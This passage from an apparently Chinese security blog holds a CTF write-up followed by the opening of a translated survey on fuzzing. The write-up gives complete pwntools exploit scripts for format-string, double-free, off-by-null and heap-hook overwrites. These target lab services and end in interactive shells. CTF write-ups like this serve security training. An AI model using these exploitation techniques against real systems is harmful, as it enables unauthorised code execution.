<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*]Found char:w</span><br><span class="line">[*]Found char:5</span><br><span class="line">[*]Found char:z</span><br><span class="line">[*]Found char:6</span><br><span class="line">[*]Found char:s</span><br><span class="line">[*]Found char:7</span><br><span class="line">[*]Found char:d</span><br><span class="line">[*]Found char:u</span><br><span class="line">[*]Found char:Q</span><br><span class="line">[*]Found char:t</span><br><span class="line">[*]Found char:R</span><br><span class="line">[*]Found char:7</span><br><span class="line">[*]Found char:A</span><br><span class="line">[*]Found char:y</span><br><span class="line">[*]Found char:F</span><br><span class="line">[*]Found char:S</span><br><span class="line">[*]Found char:T</span><br><span class="line">[*]Found char:V</span><br><span class="line">[*]Found char:h</span><br><span class="line">[*]Found char:Y</span><br><span class="line">[*]Found char:v</span><br><span class="line">[*]Found char:0</span><br><span class="line">[*]Found char:H</span><br><span class="line">[*]Found char:1</span><br><span class="line">[*]Found char:m</span><br><span class="line">[*]Found char:6</span><br><span class="line">[*]Found char:J</span><br><span class="line">[*]Found char:Z</span><br><span class="line">[*]Found char:x</span><br><span class="line">[*]Found char:b</span><br><span class="line">[*]Found char:3</span><br><span class="line">[*]Found char:3</span><br><span class="line">w5z6s7duQtR7AyFSTVhYv0H1m6JZxb33</span><br><span class="line">total: 32</span><br></pre></td></tr></table></figure></div>

<p>Flag: flag{w5z6s7duQtR7AyFSTVhYv0H1m6JZxb33}</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>简单的格式化字符串，之前需要过一个小验证，我们可以手动逆向(因为很简单)，但是也可以选择捷径，比如说 angr。</p>
<p>编写脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./pwn_MinZhu&quot;</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="number">0x08048817</span>,avoid=<span class="number">0x0804882B</span>)</span><br><span class="line"><span class="built_in">print</span>(res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure></div>

<p>得到结果</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;xNd9y6\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x01\x01\x01\x01\x01\x01\x01\x01&#x27;</span><br></pre></td></tr></table></figure></div>

<p>显然答案是 xNd9y6。</p>
<p>然后模版式的格式化字符串漏洞，API 解决</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn_MinZhu&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.29.1.38&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Key:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;xNd9y6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload1 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x0804A064</span>:<span class="number">10</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>, &#123;<span class="number">0x804A034</span>:<span class="number">0x080486B5</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>一个比较常规的 double free + UAF，要说存在难度那就是限制只能申请 fastbin 的 chunk，泄漏地址稍微麻烦一点，通过 fastbin attack + 部分地址写控制 chunk 的 size 位，伪造 unsortedbin chunk 获取 libc address，然后常规的 fastbin attack 改 malloc_hook 就好。这道题最后一个 one_gadget 可用，省去了 realloc_hook 调整 stack 结构的麻烦。</p>
<p>还要注意一点 index 是从 1 开始的，我一开始以为是从 0 开始，导致很多问题。。。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;172.29.1.25&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># context(log_level=&quot;DEBUG&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input the length of data:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input the index of sticky note that you want to delete:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;d&quot;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;e&quot;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;f&quot;</span> * <span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)    <span class="comment"># 1 -&gt; 2-&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;\x50&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;\x20&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Total:11,Index-&gt;11\nSticky note:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4c20</span></span><br><span class="line">log.success(<span class="string">&quot;libc: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">malloc_hook = libc_addr + <span class="number">0x3c4afd</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook: 0x%x&quot;</span> % malloc_hook)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf1147</span></span><br><span class="line">log.success(<span class="string">&quot;one_gadget: 0x%x&quot;</span> % one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;eeeeeeee&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;eeeeeeee&quot;</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, p64(malloc_hook))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input the length of data:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;20&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># flag&#123;IaKls58eEqsARDOfNOgkBWKOTvyqYELT&#125;</span></span><br></pre></td></tr></table></figure></div>



<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>这道题比赛的时候没有做出来，后面学弟给要到了一份 exp，简单看一下发现思路不算复杂，和 heapstorm 有些类似。</p>
<p>题目的漏洞点在于 add chunk 的时候输入数据，在字符串末尾补零导致 off-by-null。但是 size 限制的比较死，只能分配 fastbin 大小的 chunk。</p>
<p>因为 off-by-null 最常用的操作是构造 chunk overlap，但是这里只能申请 fastbin chunk 导致 off-by-null 会覆盖 chunk 的整个 size，没法利用。</p>
<p>其实解决方案很简单，用到一个关于 scanf 函数的特性，如果输入的数据很长，scanf 会自动在 heap 上面分配内存用于缓冲输入数据。而 malloc 在管理 heap 的时候存在一个 malloc_consolidate 过程，当请求的 size 很大(大于 small bin 范围)的时候，先检查 fastbin 中是否还存在 chunk，如果是，就将他们合并在一起并且放入 unsortedbin。</p>
<p>所以只要提前在 fastbin 中放置一些 chunk，然后触发 scanf 函数的 malloc 过程，fastbin 中的 chunk 就会被合并到 unsorted bin，从而完成地址泄漏、overlap 等操作。</p>
<p>首先申请一定数量的 chunk，然后触发 scanf 合并得到一块大的 unsortedbin chunk。</p>
<p>利用 off-by-null 漏洞修改 chunk size，缩小 unsortedbin chunk，得到一块 pre_size 为 0x280 的 chunk。</p>
<p>再利用 scanf 触发 fastbin 合并，从而构造出 fake unsortedbin，其中包括我们能够控制的 chunk。</p>
<p>切割 unsortedbin chunk，使 fd 落在可控 chunk 即可泄漏地址。再切割 unsortedbin chunk 得到用来泄漏地址 chunk 的控制权，此时这个 chunk 会在 chunk_list 中出现两次，使得我们可以做 double free，接下来就是常规的 tcache 利用了。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Input note len: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Note content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">consolidate</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span> * <span class="number">0x600</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):    <span class="comment"># 0 ~ 24</span></span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    <span class="comment"># fill tcache</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">13</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">consolidate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x70</span>)    <span class="comment"># clear tcache</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">25</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x78</span>)    <span class="comment"># off by null chunk shrink</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">26</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">27</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">28</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">29</span>, <span class="number">0x78</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">30</span>, <span class="number">0x78</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i) </span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line">delete(<span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">consolidate()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>, <span class="string">&quot;A&quot;</span>)    <span class="comment"># clear tcache</span></span><br><span class="line">add(<span class="number">31</span>, <span class="number">0x78</span>, <span class="string">&quot;aa&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;27&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line">free_hook = libc_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;free_hook: 0x%x&quot;</span> % free_hook)</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">27</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x78</span>, p64(system))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;30&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h2 id="AWD-pwn"><a href="#AWD-pwn" class="headerlink" title="AWD pwn"></a>AWD pwn</h2><p>第二天的攻防是 2019 国赛半决赛华东北赛区原题：note………………..</p>
<p>膜一波 le3d1ng 大佬，咱没有复现，也没有 EXP，只能被吊锤 ORZ</p>
<p>附一个爬流量写出来的脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;172.29.2.102&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;length&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content&gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">240</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">136</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">add(<span class="number">248</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">136</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">56</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">408</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">112</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">88</span>, <span class="string">&quot;/bin/sh;/bin/sh;/bin/sh  ||     &quot;</span> + p64(libc_addr + <span class="number">0x1c30</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choice&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;remarks&gt; &quot;</span>)</span><br><span class="line">p.sendline(p64(libc_addr - <span class="number">0x37f7e8</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>看起来和 pwn3 差不多呀，也是 off-by-null + size 控制的比较死，时间太晚了，俺要睡觉保命啦，之后有时间再说吧。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Fuzzing a survey 译文</title>
    <url>/2019/10/29/Fuzzing_a_survey/</url>
    <content><![CDATA[<p>本文翻译自 《Fuzzing: a survey》</p>
<p> <a class="link"   href="https://link.springer.com/article/10.1186/s42400-018-0002-y" >https://link.springer.com/article/10.1186/s42400-018-0002-y<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyright information</span><br><span class="line"></span><br><span class="line">© The Author(s) 2018</span><br><span class="line"></span><br><span class="line">Open Access</span><br><span class="line"></span><br><span class="line">This article is distributed under the terms of the Creative Commons Attribution 4.0 International License (http://creativecommons.org/licenses/by/4.0/), which permits unrestricted use, distribution, and reproduction in any medium, provided you give appropriate credit to the original author(s) and the source, provide a link to the Creative Commons license, and indicate if changes were made.</span><br></pre></td></tr></table></figure></div>

<p>Update: 2020-11-03</p>
<span id="more"></span>

<p><strong>概述</strong></p>
<p>漏洞是威胁互联网安全的根源之一。为了提前发现、修复漏洞，研究者已经开发出几种不同的测试手段，其中模糊测试是应用最为广泛的技术之一。近年来，模糊测试解决方案例如 AFL，已经在漏洞挖掘领域取得了不小的成果。这篇文章主要总结近年来出现的 fuzz 技术，并且比较它们孰优孰劣。</p>
<p>首先我们讨论一个问题：为什么 fuzz 技术如此流行？通过比较不同的漏洞挖掘方案总结一个答案。<br>接着我们回顾 fuzz 技术，并且详细讨论其中最为流行的技术：基于覆盖率的模糊测试。然后我们提出一种可以使 fuzz 更加聪明、效率更高的技术。<br>最后我们展示一些 fuzz 实例，讨论 fuzz 未来的发展方向。</p>
<p><strong>简介</strong></p>
<p>安全漏洞已经成为互联网的主要威胁之一，在 RFC 2828 给出漏洞的定义：漏洞是一个系统在设计、实现、操作、管理上的瑕疵或弱点，攻击者可以利用这些弱点绕过系统的安全策略。<br>通过利用漏洞(特别是 0day 漏洞)，攻击者可对系统造成严重的威胁。<br>2017 年的 WannaCry 勒索者病毒所利用的就是微软 SMB 协议漏洞。根据报告，WannaCry 在一天内感染了分布在 150 个国家或地区近 230000 台计算机设备。它对金融、能源、医疗等产业造成了不可估量的损失。<br>考虑到漏洞对系统造成的严重危害，研究者们在漏洞挖掘技术上投入了很多努力。<br>目前提出的漏洞挖掘方法有：静态分析、动态分析、符号执行、模糊测试<br>其中 fuzz 技术允许在对测试目标知之甚少的情况下展开测试，正处于热门阶段，在工业控制领域尤为如此。<br>fuzz 的概念于 1990 年代首次提出。通过数年的研究，fuzz 技术得到了一定的发展。然而在实际测试中，fuzz 只能找到有限的内存破坏漏洞，并且对代码的覆盖率很低。此外，随机的测试流程对于漏洞挖掘来说效率极低，所以很多提升 fuzz 效率的方式逐渐被提出。<br>结合了反馈导向-遗传算法的 fuzz 技术较之前更加灵活高效。其中的佼佼者就是 AFL fuzzer。受到 AFL 的启发，很多高效的解决方案和改进策略被提出，fuzz 技术和十几年前大有不同。因此，我们有必要总结一下研究者们杰出的工作，并且展望 fuzz 技术的未来。</p>
<p>这篇文章组织结构如下：“背景知识”小节介绍了漏洞挖掘的基础知识和技术，”模糊测试“小节针对 fuzz 技术给出详细的原理描述，包括基础概念和 fuzz 面临的关键问题。在“基于覆盖率的模糊测试”小节中，我们将介绍一种 coverage-based fuzzer 以及研究者们围绕它所做的一些工作。在“技术融合”小节中我们总结一下能够提升 fuzz 效率的几种技术，以及原理。“对不同应用进行模糊测试”小节针对几种不同的应用进行模糊测试。“fuzz 技术的新趋势”小节我们讨论和总结 fuzz 技术的发展趋势。最后在“结论”小节中总结这篇文章。</p>
<p><strong>背景知识(Background)</strong></p>
<p>在本节中，我们对于传统漏洞挖掘技术给出一个简短的介绍，包括静态分析、动态分析、污点追踪、符号执行和模糊测试。接着我们分别总结这些方案的优缺点。</p>
<p><strong>静态分析</strong><br>静态分析指的是在不运行程序的情况下进行某些分析操作。实际上静态分析手段经常被用在具有源代码或者抽象代码的情况。通过分析词法、语法、语义、数据流、模型，可以找到隐藏在内部的 BUG。<br>静态分析的优点是检测速度快。分析人员可使用静态分析工具快速检查源代码，并且在短时间内定位 BUG。然而在实际应用中，静态分析的错误率很高。由于缺少简单易用的威胁检测模型，静态分析工具总是存在大量的误报结果，因此通过工具的结果再去判断是否真的存在漏洞是一项艰苦的工作。</p>
<p><strong>动态分析</strong><br>和静态分析不同，动态分析需要一个真实的或是模拟的运行环境。通过监控和分析程序运行状态，分析工具可以清晰地检测到程序的异常。动态分析其优点是结果高度精确，但是也存在很多缺陷。<br>首先，动态调试分析程序需要大量的人工交互操作，导致分析效率低下。另外，分析程序的研究人员需要具有较强的专业知识和技能。简而言之，动态分析只适合小范围的分析，并且对人员有较高要求。</p>
